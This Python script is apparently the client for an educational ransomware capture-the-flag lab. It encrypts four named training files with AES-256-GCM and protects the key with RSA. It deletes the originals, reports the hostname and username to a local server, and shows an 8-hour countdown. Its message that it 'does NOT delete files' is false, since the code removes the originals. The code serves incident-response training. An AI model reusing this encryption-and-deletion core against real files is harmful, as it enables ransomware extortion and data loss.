import base64
import getpass
import json
import os
import shutil
import socket
import sys
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

import requests

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


SERVER_URL = "http://127.0.0.1:8080"

BASE_DIR = Path(__file__).resolve().parent.parent
LAB_SOURCE = BASE_DIR / "lab_files"
LAB_DIR = BASE_DIR / "RansomwareTrainingLab"

CLIENT_LOG = LAB_DIR / "client.log"
METADATA_FILE = LAB_DIR / "challenge.json"

ALLOWED_FILES = {
    "training.txt",
    "training.pdf",
    "training.jpg",
    "training.docx"
}


def log(message):
    LAB_DIR.mkdir(exist_ok=True)

    timestamp = datetime.now(timezone.utc).isoformat()

    line = f"{timestamp} | {message}"

    print(line)

    with open(CLIENT_LOG, "a", encoding="utf-8") as f:
        f.write(line + "\n")


def server_event(event, **data):
    try:
        requests.post(
            f"{SERVER_URL}/event",
            json={
                "event": event,
                **data
            },
            timeout=5
        )
    except requests.RequestException:
        pass


def check_server():
    response = requests.get(
        f"{SERVER_URL}/health",
        timeout=5
    )

    response.raise_for_status()

    return response.json()


def get_challenge():
    response = requests.get(
        f"{SERVER_URL}/challenge",
        timeout=5
    )

    response.raise_for_status()

    return response.json()


def register():
    hostname = socket.gethostname()
    username = getpass.getuser()

    requests.post(
        f"{SERVER_URL}/register",
        json={
            "hostname": hostname,
            "username": username
        },
        timeout=5
    )


def prepare_lab():
    LAB_DIR.mkdir(exist_ok=True)

    for filename in ALLOWED_FILES:

        source = LAB_SOURCE / filename
        destination = LAB_DIR / filename

        if not source.exists():
            raise FileNotFoundError(
                f"Missing laboratory file: {source}"
            )

        shutil.copy2(source, destination)

    log("LAB_CREATED")

    server_event(
        "LAB_CREATED",
        files=sorted(ALLOWED_FILES)
    )


def load_public_key(pem):
    return serialization.load_pem_public_key(
        pem.encode()
    )


def encrypt_lab_files(public_key):
    # AES-256 key.
    aes_key = AESGCM.generate_key(bit_length=256)

    nonce = os.urandom(12)

    aes = AESGCM(aes_key)

    encrypted_files = []

    for filename in sorted(ALLOWED_FILES):

        original = LAB_DIR / filename

        # Safety boundary:
        # never follow paths outside LAB_DIR.
        if original.parent.resolve() != LAB_DIR.resolve():
            raise RuntimeError("Unsafe laboratory path")

        plaintext = original.read_bytes()

        ciphertext = aes.encrypt(
            nonce,
            plaintext,
            filename.encode()
        )

        encrypted_path = LAB_DIR / f"{filename}.enc"

        encrypted_path.write_bytes(
            ciphertext
        )

        original.unlink()

        encrypted_files.append(
            encrypted_path.name
        )

    # RSA protects the AES key.
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(
                algorithm=hashes.SHA256()
            ),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    metadata = {
        "algorithm": "AES-256-GCM",
        "key_protection": "RSA-OAEP-SHA256",
        "nonce": base64.b64encode(nonce).decode(),
        "encrypted_aes_key": base64.b64encode(
            encrypted_aes_key
        ).decode(),
        "files": encrypted_files,
        "created": datetime.now(
            timezone.utc
        ).isoformat(),
        "countdown_hours": 8
    }

    METADATA_FILE.write_text(
        json.dumps(
            metadata,
            indent=2
        ),
        encoding="utf-8"
    )

    log("AES_KEY_GENERATED")
    log("FILES_ENCRYPTED")

    server_event(
        "AES_KEY_GENERATED",
        algorithm="AES-256-GCM"
    )

    server_event(
        "FILES_ENCRYPTED",
        files=encrypted_files
    )

    return metadata


def countdown():
    start = datetime.now(timezone.utc)
    expiry = start + timedelta(hours=8)

    log(
        f"COUNTDOWN_STARTED | expires={expiry.isoformat()}"
    )

    server_event(
        "COUNTDOWN_STARTED",
        expires=expiry.isoformat()
    )

    print()
    print("================================================")
    print(" TRAINING COUNTDOWN")
    print("================================================")
    print(" 8 hours")
    print()
    print(" No files outside the training directory")
    print(" will ever be modified or deleted.")
    print("================================================")
    print()


def unlock(private_key_pem):
    try:
        private_key = serialization.load_pem_private_key(
            private_key_pem,
            password=None
        )
    except Exception:
        log("UNLOCK_ATTEMPT | INVALID_RSA_KEY")
        server_event(
            "UNLOCK_ATTEMPT",
            result="INVALID_RSA_KEY"
        )
        return False

    metadata = json.loads(
        METADATA_FILE.read_text(
            encoding="utf-8"
        )
    )

    try:
        encrypted_aes_key = base64.b64decode(
            metadata["encrypted_aes_key"]
        )

        aes_key = private_key.decrypt(
            encrypted_aes_key,
            padding.OAEP(
                mgf=padding.MGF1(
                    algorithm=hashes.SHA256()
                ),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        nonce = base64.b64decode(
            metadata["nonce"]
        )

        aes = AESGCM(aes_key)

        for encrypted_filename in metadata["files"]:

            encrypted_path = LAB_DIR / encrypted_filename

            original_filename = encrypted_filename[:-4]

            output_path = LAB_DIR / original_filename

            ciphertext = encrypted_path.read_bytes()

            plaintext = aes.decrypt(
                nonce,
                ciphertext,
                original_filename.encode()
            )

            output_path.write_bytes(
                plaintext
            )

            encrypted_path.unlink()

        log("FILES_DECRYPTED")

        server_event(
            "FILES_DECRYPTED",
            result="SUCCESS"
        )

        log("CHALLENGE_COMPLETED")

        server_event(
            "CHALLENGE_COMPLETED",
            result="SUCCESS"
        )

        return True

    except Exception as exc:

        log(
            f"UNLOCK_ATTEMPT | FAILED | {type(exc).__name__}"
        )

        server_event(
            "UNLOCK_ATTEMPT",
            result="FAILED"
        )

        return False


def main():

    print()
    print("==============================================")
    print(" Educational Ransomware CTF")
    print(" AES-256 + RSA")
    print("==============================================")
    print()

    try:
        health = check_server()

        print(
            f"[+] Server OK - {health['challenge_id']}"
        )

        challenge = get_challenge()

        public_key = load_public_key(
            challenge["public_key"]
        )

        register()

        prepare_lab()

        metadata = encrypt_lab_files(
            public_key
        )

        countdown()

        print(
            "[+] Training encryption completed."
        )

        print(
            f"[+] Encrypted files: "
            f"{len(metadata['files'])}"
        )

        print()
        print(
            "The DFIR/SOC analyst must investigate"
        )
        print(
            "the generated artifacts and recover"
        )
        print(
            "the RSA private key through the CTF."
        )

        print()
        print(
            "This program does NOT delete files."
        )

        return 0

    except requests.RequestException:
        print(
            "[!] Training server unavailable."
        )
        print(
            "[!] Start server/server.py first."
        )
        return 1

    except Exception as exc:
        print(
            f"[!] Error: {type(exc).__name__}: {exc}"
        )
        return 1


if __name__ == "__main__":
    sys.exit(main())
